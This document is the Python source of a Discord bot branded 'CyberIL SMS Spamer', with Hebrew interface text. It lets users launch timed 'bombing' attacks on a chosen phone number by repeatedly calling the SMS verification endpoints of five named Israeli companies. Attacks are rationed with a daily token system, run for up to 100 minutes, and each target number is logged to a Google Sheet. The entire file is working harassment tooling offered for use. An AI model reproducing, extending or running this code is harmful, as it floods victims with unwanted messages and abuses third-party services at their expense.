import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
from datetime import datetime, timedelta

# הגדרות סביבה
TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL') # ה-URL שקיבלת מה-App Script (Deployment URL)

# חסימת מספר ספציפי
BLOCKED_NUMBER = "0535524017"

# ניהול נתונים בזיכרון
user_tokens = {}  # {user_id: total_minutes}
user_cooldowns = {}  # {user_id: next_claim_time}
active_attacks = {}

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = CyberBot()

# --- פונקציות עזר ועיצוב ---
def get_balance(user_id):
    return user_tokens.get(user_id, 0)

def can_claim(user_id):
    if user_id not in user_cooldowns: return True
    return datetime.now() >= user_cooldowns[user_id]

def send_to_sheet(user_name, user_id, phone, minutes, success, failed):
    if not GSHEET_URL: return
    payload = {
        "user_name": user_name,
        "user_id": str(user_id),
        "target_phone": phone,
        "rounds": f"{minutes} min",
        "success_count": success,
        "failed_count": failed
    }
    try:
        requests.post(GSHEET_URL, json=payload, timeout=8)
    except Exception as e:
        print(f"❌ GSheet Error: {e}")

# --- מנוע ה-API ---
def api_request(url, payload=None, method="POST", is_json=True):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if method == "GET": r = requests.get(url, headers=headers, timeout=4)
        elif method == "PUT": r = requests.put(url, json=payload, headers=headers, timeout=4)
        else:
            if is_json: r = requests.post(url, json=payload, headers=headers, timeout=4)
            else: r = requests.post(url, data=payload, headers=headers, timeout=4)
        return r.status_code in [200, 201]
    except: return False

async def fire_round(phone):
    tasks = [
        asyncio.to_thread(api_request, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
        asyncio.to_thread(api_request, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}),
        asyncio.to_thread(api_request, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
    ]
    results = await asyncio.gather(*tasks)
    return sum(results), len(results) - sum(results)

# --- לוגיקת הרצה ---
async def run_attack_logic(interaction, phone, minutes):
    uid = interaction.user.id
    if phone == BLOCKED_NUMBER:
        return await interaction.followup.send("🚫 **המספר הזה חסום במערכת!**", ephemeral=True)

    active_attacks[uid] = True
    total_s, total_f = 0, 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🚀 **ההפצצה החלה!**\n📱 יעד: `{phone}`\n⏳ זמן: `{minutes}` דקות", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        if get_balance(uid) <= 0: break
        
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        
        # הורדת טוקן (דקה) כל 60 שניות
        await asyncio.sleep(60)
        user_tokens[uid] -= 1

    send_to_sheet(interaction.user.name, uid, phone, minutes, total_s, total_f)
    active_attacks.pop(uid, None)
    
    final_embed = discord.Embed(title="🏁 הפצצה הסתיימה", color=0x00FF00)
    final_embed.add_field(name="📱 יעד", value=phone)
    final_embed.add_field(name="✅ הצלחות", value=total_s)
    final_embed.add_field(name="❌ כשלונות", value=total_f)
    await interaction.followup.send(embed=final_embed, ephemeral=True)

# --- ממשק דיסקורד מעוצב ---
class AttackControl(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 שגר הפצצה", style=discord.ButtonStyle.danger, custom_id="start_atk")
    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if get_balance(interaction.user.id) < 1:
            return await interaction.response.send_message("❌ **אין לך טוקנים!** לחץ על 'קח טוקן יומי'.", ephemeral=True)
            
        class BombModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון (10 ספרות)", min_length=10, max_length=10, placeholder="0501234567")
            minutes = discord.ui.TextInput(label="משך זמן (בדקות)", default="5", placeholder="1-100")
            
            async def on_submit(self, modal_inter: discord.Interaction):
                try:
                    m = int(self.minutes.value)
                    if m > 100: m = 100
                    if m > get_balance(interaction.user.id):
                        return await modal_inter.response.send_message(f"❌ אין לך מספיק דקות! יתרה: {get_balance(interaction.user.id)}", ephemeral=True)
                    
                    await modal_inter.response.defer(ephemeral=True)
                    asyncio.create_task(run_attack_logic(modal_inter, self.phone.value, m))
                except:
                    await modal_inter.response.send_message("❌ נא להזין מספר דקות תקין.", ephemeral=True)
        await interaction.response.send_modal(BombModal())

    @discord.ui.button(label="💰 בדיקת מטבעות", style=discord.ButtonStyle.primary, emoji="💳")
    async def balance_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        balance = get_balance(interaction.user.id)
        await interaction.response.send_message(f"💳 היתרה שלך: **{balance} טוקנים** (דקות ספאם).", ephemeral=True)

    @discord.ui.button(label="🎁 טוקן יומי", style=discord.ButtonStyle.success, emoji="🧧")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        if can_claim(uid):
            user_tokens[uid] = get_balance(uid) + 5
            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
            await interaction.response.send_message(f"✅ **בוצע!** קיבלת 5 טוקנים (5 דקות). יתרה: {user_tokens[uid]}", ephemeral=True)
        else:
            diff = user_cooldowns[uid] - datetime.now()
            h, r = divmod(int(diff.total_seconds()), 3600)
            m, _ = divmod(r, 60)
            await interaction.response.send_message(f"⏳ כבר לקחת! תחזור בעוד {h} שעות ו-{m} דקות.", ephemeral=True)

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary, emoji="✖️")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🚨 **עוצר את הכל...**", ephemeral=True)

@bot.tree.command(name="spamer-setup", description="פתיחת לוח בקרה של CyberIL")
async def spamer_setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⚡ CyberIL SMS Spamer Control",
        description="ברוך הבא למערכת הספאם המתקדמת. השתמש בכפתורים למטה לניהול.",
        color=0xFF0000
    )
    embed.add_field(name="📊 סטטיסטיקה", value=f"יתרה: `{get_balance(interaction.user.id)}` דקות\nסטטוס שרת: `Online`", inline=False)
    embed.set_footer(text="CyberIL System | v2.5")
    embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1006/1006555.png") # אייקון של האקר/פצצה
    
    await interaction.response.send_message(embed=embed, view=AttackControl())

@bot.tree.command(name="spamer-givetokens", description="הענקת טוקנים למשתמש (ניהול)")
async def give_tokens(interaction: discord.Interaction, user: discord.Member, amount: int):
    # כאן מומלץ להוסיף בדיקת מנהל
    user_tokens[user.id] = get_balance(user.id) + amount
    await interaction.response.send_message(f"🎁 הוענקו **{amount}** טוקנים ל-{user.mention}.", ephemeral=True)

bot.run(TOKEN)
